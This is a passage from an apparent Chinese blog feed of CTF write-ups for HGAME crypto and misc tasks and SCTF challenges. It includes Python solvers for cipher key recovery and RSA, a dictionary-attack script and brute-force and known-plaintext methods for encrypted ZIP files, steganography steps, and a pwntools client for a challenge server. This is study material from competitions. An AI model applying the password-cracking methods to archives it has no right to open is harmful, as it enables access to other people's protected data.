stretchy=\"false\">(</mo><mi>c</mi><mo>−</mo><mi>m</mi><mo stretchy=\"false\">)</mo><mi>m</mi><mi>o</mi><mi>d</mi><mn>26</mn></mrow><annotation encoding=\"application/x-tex\">k=(c-m) mod 26</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6944em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">c</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mclose\">)</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mord\">26</span></span></span></span><br />\n 关键点就在怎么把打乱 encrypt 和 original 一一对应起来，而且要排除标点符号对求 key 的干扰<br />\n因为仔细看 encrypt.py 的话，标点符号虽然不会参与加密，但是还是会占据一个 key 的位置</p>\n<p>用 isalpha () 的功能判断字母，然后把字母替换成 &quot;*&quot;，保留标点符号，这样得到的字符串相当于一个标准的模板，对于对应的 original 和 encrypt 来说，他们的 template 都是一样的，这样就能把原文和密文对应起来。<br />\n找到了对应的原文和密文，解得正确的 key 就比较容易了（不过要记得排除标点符号的干扰）<br />\nexp 如下：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 函数功能：把字母变成‘*’，保留标点符号</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_feature</span>(<span class=\"params\">s</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"string\">&quot;&quot;</span>.join([<span class=\"string\">&#x27;*&#x27;</span> <span class=\"keyword\">if</span> c.isalpha() <span class=\"keyword\">else</span> c <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> s]) </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 用original文件夹初始化template，并将原文保存在txts_ori里面</span></span><br><span class=\"line\">path_ori=<span class=\"string\">&#x27;original&#x27;</span></span><br><span class=\"line\">files_ori=os.listdir(path_ori)</span><br><span class=\"line\">template=[]</span><br><span class=\"line\">txts_ori = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> file <span class=\"keyword\">in</span> files_ori:</span><br><span class=\"line\">\tposition = path_ori+<span class=\"string\">&#x27;\\\\&#x27;</span>+ file</span><br><span class=\"line\">\t<span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(position, <span class=\"string\">&quot;r&quot;</span>,encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">\t\tdata = f.read()</span><br><span class=\"line\">\t\tm=get_feature(data)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(m)!=<span class=\"number\">0</span> <span class=\"keyword\">and</span> m <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> template:</span><br><span class=\"line\">\t\t\ttxts_ori.append(data)</span><br><span class=\"line\">\t\t\ttemplate.append(m)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 处理encrypt文件夹内的数据，在template里匹配对应的原文，得到对应的密钥</span></span><br><span class=\"line\">keys=[-<span class=\"number\">1</span>]*<span class=\"number\">410</span></span><br><span class=\"line\">path_enc=<span class=\"string\">&#x27;encrypt&#x27;</span></span><br><span class=\"line\">files_enc=os.listdir(path_enc)</span><br><span class=\"line\"><span class=\"keyword\">for</span> file <span class=\"keyword\">in</span> files_enc:</span><br><span class=\"line\">\tposition = path_enc+<span class=\"string\">&#x27;\\\\&#x27;</span>+ file</span><br><span class=\"line\">\t<span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(position, <span class=\"string\">&quot;r&quot;</span>,encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">\t\tdata = f.read()</span><br><span class=\"line\">\t\tm=get_feature(data)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(m)!=<span class=\"number\">0</span> <span class=\"keyword\">and</span> m <span class=\"keyword\">in</span> template:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(data)):</span><br><span class=\"line\">\t\t\t\tk=((<span class=\"built_in\">ord</span>(data[i])-<span class=\"built_in\">ord</span>(txts_ori[template.index(m)][i]))%<span class=\"number\">26</span>)</span><br><span class=\"line\">\t\t\t\tj=i%(<span class=\"built_in\">len</span>(keys))</span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">#保证每次写入keys时该位置没有写入过，且对应密文不是标点符号</span></span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> keys[j]==-<span class=\"number\">1</span> <span class=\"keyword\">and</span> m[i]==<span class=\"string\">&#x27;*&#x27;</span>:</span><br><span class=\"line\">\t\t\t\t\tkeys[j]=k</span><br><span class=\"line\"><span class=\"comment\"># 用keys解密</span></span><br><span class=\"line\">enc=<span class=\"string\">&quot;xaawr&#123;B0_d0l_cs0m_&#x27;Pp0mn-odn1vpabt_deqzcq&#x27;?&#125;&quot;</span></span><br><span class=\"line\">result = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(enc)):</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> enc[i].isupper():</span><br><span class=\"line\">\t\tresult += <span class=\"built_in\">chr</span>((<span class=\"built_in\">ord</span>(enc[i]) - keys[i] - <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;A&#x27;</span>)) % <span class=\"number\">26</span> + <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;A&#x27;</span>))</span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> enc[i].islower():</span><br><span class=\"line\">\t\tresult += <span class=\"built_in\">chr</span>((<span class=\"built_in\">ord</span>(enc[i]) - keys[i] - <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>)) % <span class=\"number\">26</span> + <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>))</span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\tresult += enc[i]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(result)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"easy-rsa\"><a class=\"anchor\" href=\"#easy-rsa\">#</a> Easy RSA</h3>\n<p>这道题，还是不细说了，属于是最最最基本的 RSA 了，<br />\n该给的全都给了，连 p, q 都直接给了<br />\n exp:<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> gmpy2</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> long_to_bytes</span><br><span class=\"line\"></span><br><span class=\"line\">string=[]</span><br><span class=\"line\"><span class=\"keyword\">for</span> (e,p,q,c) <span class=\"keyword\">in</span> [(<span class=\"number\">12433</span>, <span class=\"number\">149</span>, <span class=\"number\">197</span>, <span class=\"number\">104</span>), (<span class=\"number\">8147</span>, <span class=\"number\">131</span>, <span class=\"number\">167</span>, <span class=\"number\">6633</span>), (<span class=\"number\">10687</span>, <span class=\"number\">211</span>, <span class=\"number\">197</span>, <span class=\"number\">35594</span>), (<span class=\"number\">19681</span>, <span class=\"number\">131</span>, <span class=\"number\">211</span>, <span class=\"number\">15710</span>), (<span class=\"number\">33577</span>, <span class=\"number\">251</span>, <span class=\"number\">211</span>, <span class=\"number\">38798</span>), (<span class=\"number\">30241</span>, <span class=\"number\">157</span>, <span class=\"number\">251</span>, <span class=\"number\">35973</span>), (<span class=\"number\">293</span>, <span class=\"number\">211</span>, <span class=\"number\">157</span>, <span class=\"number\">31548</span>), (<span class=\"number\">26459</span>, <span class=\"number\">179</span>, <span class=\"number\">149</span>, <span class=\"number\">4778</span>), (<span class=\"number\">27479</span>, <span class=\"number\">149</span>, <span class=\"number\">223</span>, <span class=\"number\">32728</span>), (<span class=\"number\">9029</span>, <span class=\"number\">223</span>, <span class=\"number\">137</span>, <span class=\"number\">20696</span>), (<span class=\"number\">4649</span>, <span class=\"number\">149</span>, <span class=\"number\">151</span>, <span class=\"number\">13418</span>), (<span class=\"number\">11783</span>, <span class=\"number\">223</span>, <span class=\"number\">251</span>, <span class=\"number\">14239</span>), (<span class=\"number\">13537</span>, <span class=\"number\">179</span>, <span class=\"number\">137</span>, <span class=\"number\">11702</span>), (<span class=\"number\">3835</span>, <span class=\"number\">167</span>, <span class=\"number\">139</span>, <span class=\"number\">20051</span>), (<span class=\"number\">30983</span>, <span class=\"number\">149</span>, <span class=\"number\">227</span>, <span class=\"number\">23928</span>), (<span class=\"number\">17581</span>, <span class=\"number\">157</span>, <span class=\"number\">131</span>, <span class=\"number\">5855</span>), (<span class=\"number\">35381</span>, <span class=\"number\">223</span>, <span class=\"number\">179</span>, <span class=\"number\">37774</span>), (<span class=\"number\">2357</span>, <span class=\"number\">151</span>, <span class=\"number\">223</span>, <span class=\"number\">1849</span>), (<span class=\"number\">22649</span>, <span class=\"number\">211</span>, <span class=\"number\">229</span>, <span class=\"number\">7348</span>), (<span class=\"number\">1151</span>, <span class=\"number\">179</span>, <span class=\"number\">223</span>, <span class=\"number\">17982</span>), (<span class=\"number\">8431</span>, <span class=\"number\">251</span>, <span class=\"number\">163</span>, <span class=\"number\">30226</span>), (<span class=\"number\">38501</span>, <span class=\"number\">193</span>, <span class=\"number\">211</span>, <span class=\"number\">30559</span>), (<span class=\"number\">14549</span>, <span class=\"number\">211</span>, <span class=\"number\">151</span>, <span class=\"number\">21143</span>), (<span class=\"number\">24781</span>, <span class=\"number\">239</span>, <span class=\"number\">241</span>, <span class=\"number\">45604</span>), (<span class=\"number\">8051</span>, <span class=\"number\">179</span>, <span class=\"number\">131</span>, <span class=\"number\">7994</span>), (<span class=\"number\">863</span>, <span class=\"number\">181</span>, <span class=\"number\">131</span>, <span class=\"number\">11493</span>), (<span class=\"number\">1117</span>, <span class=\"number\">239</span>, <span class=\"number\">157</span>, <span class=\"number\">12579</span>), (<span class=\"number\">7561</span>, <span class=\"number\">149</span>, <span class=\"number\">199</span>, <span class=\"number\">8960</span>), (<span class=\"number\">19813</span>, <span class=\"number\">239</span>, <span class=\"number\">229</span>, <span class=\"number\">53463</span>), (<span class=\"number\">4943</span>, <span class=\"number\">131</span>, <span class=\"number\">157</span>, <span class=\"number\">14606</span>), (<span class=\"number\">29077</span>, <span class=\"number\">191</span>, <span class=\"number\">181</span>, <span class=\"number\">33446</span>), (<span class=\"number\">18583</span>, <span class=\"number\">211</span>, <span class=\"number\">163</span>, <span class=\"number\">31800</span>), (<span class=\"number\">30643</span>, <span class=\"number\">173</span>, <span class=\"number\">191</span>, <span class=\"number\">27293</span>), (<span class=\"number\">11617</span>, <span class=\"number\">223</span>, <span class=\"number\">251</span>, <span class=\"number\">13448</span>), (<span class=\"number\">19051</span>, <span class=\"number\">191</span>, <span class=\"number\">151</span>, <span class=\"number\">21676</span>), (<span class=\"number\">18367</span>, <span class=\"number\">179</span>, <span class=\"number\">157</span>, <span class=\"number\">14139</span>), (<span class=\"number\">18861</span>, <span class=\"number\">149</span>, <span class=\"number\">191</span>, <span class=\"number\">5139</span>), (<span class=\"number\">9581</span>, <span class=\"number\">211</span>, <span class=\"number\">193</span>, <span class=\"number\">25595</span>)]:</span><br><span class=\"line\">\td = <span class=\"built_in\">int</span>(gmpy2.invert(e, (p-<span class=\"number\">1</span>)*(q-<span class=\"number\">1</span>)))</span><br><span class=\"line\">\tm = <span class=\"built_in\">pow</span>(c, d, p*q)</span><br><span class=\"line\">\tstring.append(long_to_bytes(m).decode())</span><br><span class=\"line\">Str=<span class=\"string\">&#x27;&#x27;</span>.join(string)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(Str)</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h2>\n<h3 id=\"这个压缩包有点麻烦\"><a class=\"anchor\" href=\"#这个压缩包有点麻烦\">#</a> 这个压缩包有点麻烦</h3>\n<p>这道题属实是把那些，基本的有关压缩包的方法都涉及到了，挺全面的入门题</p>\n<h4 id=\"暴力破解\"><a class=\"anchor\" href=\"#暴力破解\">#</a> 暴力破解</h4>\n<p>打开压缩包，三个文件都被加密，不太正常，所以考虑暴力破解或者是伪加密能直接解出。<br />\n用 010 打开，文件最后出现提示：</p>\n<blockquote>\n<p>Pure numeric passwords within 6 digits are not safe!</p>\n</blockquote>\n<p>所以用 ARCHPR 暴力破解，范围仅勾选数字，得到密码：483279</p>\n<h4 id=\"字典攻击\"><a class=\"anchor\" href=\"#字典攻击\">#</a> 字典攻击</h4>\n<p>上一轮的密码解压得到三个文件：flag.zip、password-note.txt、README.txt<br />\n 要解压 flag.zip 又需要密码，打开 README.txt 看到提示：</p>\n<blockquote>\n<p>I don't know if it's a good idea to write down all the passwords.</p>\n</blockquote>\n<p>显然 passwords 可能的都被写在 password-note.txt 里面了<br />\n用 ARCHPR 的字典攻击即可，得到密码：&amp;-`;qpCKliw2yTR\\</p>\n<p>之后又尝试写了一个脚本，运行也可以得到密码：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> zipfile</span><br><span class=\"line\">zip_file = zipfile.ZipFile(<span class=\"string\">&#x27;flag.zip&#x27;</span>)</span><br><span class=\"line\">zip_list = zip_file.namelist()</span><br><span class=\"line\">f=<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;password-note.txt&#x27;</span>, <span class=\"string\">&quot;r&quot;</span>)</span><br><span class=\"line\">lines = f.readlines()</span><br><span class=\"line\"><span class=\"keyword\">for</span> password <span class=\"keyword\">in</span> lines:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        zip_file.extractall(path=<span class=\"string\">&#x27;Test&#x27;</span>, pwd=password[:-<span class=\"number\">1</span>].encode(<span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;the password is &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(password[:-<span class=\"number\">1</span>]))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"comment\">#print(&quot;the password is &#123;&#125;&quot;.format(password[:-1]))</span></span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"明文攻击\"><a class=\"anchor\" href=\"#明文攻击\">#</a> 明文攻击</h4>\n<p>解压后又得到了一个 flag.zip 和 README.txt... (/▽＼)<br />\n flag.zip 中的内容一样被加密，其中包含 flag.jpg 和 README.txt<br />\n 仔细观察发现，两个 README.txt 的大小都是 68KB，所以考虑可能是明文攻击</p>\n<p>再看一下 README.txt，有提示</p>\n<blockquote>\n<p>If you don't like to spend time compressing files, just stores them.</p>\n</blockquote>\n<p>联系 flag.zip 的加密算法：ZipCrypto Store，已经基本可以确定是明文了，</p>\n<p>把给的 README.txt 用 Zip 的存储方式加密，打开对比两个 README.txt 的 CRC 值，<br />\n均为 966AC0E8</p>\n<p>再次使用 ARCHPR，选择明文攻击，<br />\n等待 1~2 分钟左右点击停止即可，不用等它执行完</p>\n<h4 id=\"伪加密\"><a class=\"anchor\" href=\"#伪加密\">#</a> 伪加密</h4>\n<p>明文攻击后得到了去除密码的一个 zip，<br />\n解压得到 flag.jpg 如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437720/Typera/2023/04/11a450d036a1c818089a7374c1f615a3.jpg\" alt=\"hgameM10\" /><br />\n 实际上从 7z 里面是能直接再点开这个 flag.jpg 的，可以看到里面还有一个 flag.jpg (￣_,￣)<br />\n 显然这个 flag.jpg 后面还藏了一个压缩包，使用 binwalk 分离，得到 4FC5.zip</p>\n<p>虽然有点奇怪，这里 7z 为啥不能直接打开这个新的压缩包，但尝试之后发现这个确实是伪加密<br />\n直接更改下图选中内容为 00 即可<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437699/Typera/2023/04/63704e239d39fc6a92fc0cb525370a7b.png\" alt=\"image-20230425234814596\" /></p>\n<p>终于得到了 flag：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437761/Typera/2023/04/53c11a8e13bbe5c3adfdef057ed8493c.png\" alt=\"image-20230425234917756\" /></p>\n<h3 id=\"好康的流量\"><a class=\"anchor\" href=\"#好康的流量\">#</a> 好康的流量</h3>\n<p>Wireshark 打开，右键 -&gt; 追踪流 -&gt;TCP 流，得到 base64 格式的图片文件：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437776/Typera/2023/04/c529efa42a73e54e0034029e844f57ca.png\" alt=\"image-20230425234931156\" /></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudG9vbG5iLmNvbS90b29scy9iYXNlNjRUb0ltYWdlcy5odG1s\">在线 base64 转换图片</span>得到：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437788/Typera/2023/04/7299c09dac948f983d1c5126055c377d.png\" alt=\"image-20230425234943176\" /></p>\n<p>stegsolve 打开，G2 得到一个条形码：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437796/Typera/2023/04/473ee4ccb1baae2f6d8baebff4eb969b.png\" alt=\"image-20230425234952577\" /><br />\n 保存后，<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZW1vLmR5bmFtc29mdC5jb20vYmFyY29kZS1yZWFkZXIv\">在线扫描图片</span>得到前半段 flag  <code>hgame&#123;ez_1mg_</code></p>\n<p>然后在 Analyse-&gt;Data Extract 里面，<br />\n按下图所示操作，可以得到后半 flag  <code>Steg4n0graphy&#125;</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437806/Typera/2023/04/c026469fb7ab3fceba720421bc3cea72.png\" alt=\"image-20230425235001793\" /></p>\n<h3 id=\"群青其实是幽灵东京\"><a class=\"anchor\" href=\"#群青其实是幽灵东京\">#</a> 群青 (其实是幽灵东京）</h3>\n<p>拿到.wav 文件，发现属性里藏了提示：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437816/Typera/2023/04/61191b2c8ce2754adbb5f4270499d7fc.png\" alt=\"image-20230425235012882\" /><br />\n 提示使用用 SilentEye，<br />\n直接 Decode 显示不正确，所以猜测要使用密码</p>\n<p>Audacity 打开，查看频谱图发现：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437826/Typera/2023/04/9b37356f52ea60ba659337e1615d5527.png\" alt=\"image-20230425235021424\" /><br />\n 猜测大概就是 key 了：Yoasobi<br />\n 解密得到一串网址，貌似是一个音频文件的地址<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437834/Typera/2023/04/097e85d689cebdbc315a2e1d74bf20c1.png\" alt=\"image-20230425235030317\" /><br />\n 访问下载得音频文件 S_S_T_V.wav</p>\n<p>搜索 SSTV，得知：SSTV（Slow-scan television）是一种图像传输方法，主要由业余无线电操作员使用，通过单色或彩色无线电发送和接收静态图像。</p>\n<p>原本想使用 RX-SSTV 解码器，但是貌似我的电脑上还需要安装一个叫 Virtual Audio Cable 的虚拟声卡，实在是太麻烦了 (╯□╰)<br />\n 所以我就干脆在手机上下载了 Robot36，用电脑播放音频，手机接听，最后得到这样一张图<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437848/Typera/2023/04/267cd6c07e0bbbdcb3b0b57595089963.png\" alt=\"image-20230425235041961\" /></p>\n<p>然后扫码得到 flag： <code>hgame&#123;1_c4n_5ee_the_wav&#125;</code></p>\n",
            "tags": [
                "Python",
                "Crypto",
                "CTF",
                "Misc"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/SCTF%E5%A4%8D%E7%8E%B0/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/SCTF%E5%A4%8D%E7%8E%B0/",
            "title": "SCTF复现",
            "date_published": "2022-01-29T16:18:22.000Z",
            "content_html": "<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> MISC</h2>\n<h3 id=\"fumo_xor_cli116\"><a class=\"anchor\" href=\"#fumo_xor_cli116\">#</a> fumo_xor_cli（1.16）</h3>\n<p>啊啊啊，做这道题的时候就差一点，两张需要 xor 的图也导出来了，就是第一张那个需要叠加的图貌似排反了 ┭┮﹏┭┮<br />\n<s>（做的时候就发现两张图长度都是一样的，难怪我说 xor 出来不太对劲。。。）</s></p>\n<h4 id=\"第一张图\"><a class=\"anchor\" href=\"#第一张图\">#</a> 第一张图</h4>\n<p>nc 连上之后，发现出来了一堆彩色字符<br />\n python PIL 转为图片，发现中间有两张图片部分有点奇怪<br />\n搜索了一下大概是 ANSI 转义字符，大致格式如下：</p>\n<blockquote>\n<p>\\x1b[ 38 ; 2 ;  208 ; 243 ; 251 m9<br />\n38;2;<em>r</em>;<em>g</em>;<em>b</em> Set text colour to an RGB value (e.g.  <code>\\x1b[38;2;255;255;0m</code> )</p>\n</blockquote>\n<p>由于 编程水平稀烂，总之写的转 png 的代码。。。一言难尽<br />\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\">r=remote(<span class=\"string\">&quot;124.70.150.39&quot;</span>,<span class=\"number\">2333</span>)</span><br><span class=\"line\">img=[]</span><br><span class=\"line\">k=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">while</span>(k&lt;<span class=\"number\">56</span>):</span><br><span class=\"line\">\timg.append(Image.new(<span class=\"string\">&quot;RGB&quot;</span>,(<span class=\"number\">133</span>,<span class=\"number\">50</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\">\tr.recvuntil(<span class=\"string\">b&#x27;\\x1b[&#x27;</span>)</span><br><span class=\"line\">\ts=r.recvuntil(<span class=\"string\">b&#x27;\\x1b[&#x27;</span>)</span><br><span class=\"line\">\tj=<span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> j&lt;<span class=\"number\">50</span>:</span><br><span class=\"line\">\t\ti=<span class=\"number\">0</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> s==<span class=\"string\">b&#x27;A\\x1b[&#x27;</span>:</span><br><span class=\"line\">\t\t\t\ts=r.recvuntil(<span class=\"string\">b&#x27;\\x1b[&#x27;</span>)</span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">#print(s)</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t\ts=r.recvuntil(<span class=\"string\">b&#x27;\\x1b[&#x27;</span>)</span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">#print(s)</span></span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> <span class=\"string\">b&#x27;\\n&#x27;</span><span class=\"keyword\">in</span> s:</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">#print(s.split(b&#x27;;&#x27;)[2:])</span></span><br><span class=\"line\">\t\t\t\tpixTuple=(<span class=\"built_in\">int</span>((s.split(<span class=\"string\">b&#x27;;&#x27;</span>)[<span class=\"number\">2</span>:])[<span class=\"number\">0</span>]),<span class=\"built_in\">int</span>((s.split(<span class=\"string\">b&#x27;;&#x27;</span>)[<span class=\"number\">2</span>:])[<span class=\"number\">1</span>]),<span class=\"built_in\">int</span>((s.split(<span class=\"string\">b&#x27;;&#x27;</span>)[<span class=\"number\">2</span>:])[<span class=\"number\">2</span>][:-<span class=\"number\">4</span>]))</span><br><span class=\"line\">\t\t\t\timg[k].putpixel((i,j),pixTuple)</span><br><span class=\"line\">\t\t\t\ti=i+<span class=\"number\">1</span></span><br><span class=\"line\">\t\tj=j+<span class=\"number\">1</span></span><br><span class=\"line\">\timg[k].save(<span class=\"string\">&#x27;/1/%d.png&#x27;</span>%(k))</span><br><span class=\"line\">\tk=k+<span class=\"number\">1</span></span><br></pre></td></tr></table></figure><br />\n 所以我们得到了 56 张图片，emm... 中间有两张是，五彩斑斓的，肯定有问题，<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436722/Typera/2023/04/1fe97ece1c8993cbf990893b9dd0679d.png\" alt=\"SM1\" /><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436754/Typera/2023/04/eea64334d4a3ac700d91945121083752.png\" alt=\"SM2\" /></p>\n<h4 id=\"第二张图\"><a class=\"anchor\" href=\"#第二张图\">#</a> 第二张图</h4>\n<p>在 Lu1u 的提示下，原来这里面还有个网址，进入 (<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvRV9pREpCa1ZFQzRqWmFuenZxbldDQTA=\">https://mp.weixin.qq.com/s/E_iDJBkVEC4jZanzvqnWCA0</span>)<br />\n 在最后找到了一张 fumo 的图片<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436784/Typera/2023/04/3ca22b531d34b89abc0f97bc0c306804.png\" alt=\"SM3\" /><br />\n 放大发现了一个间隔为 9 的点阵，因为感觉这些点的颜色和上面得到的那两张图挺像的，所以想到继续可以把这些点提出来合成一张图片</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span 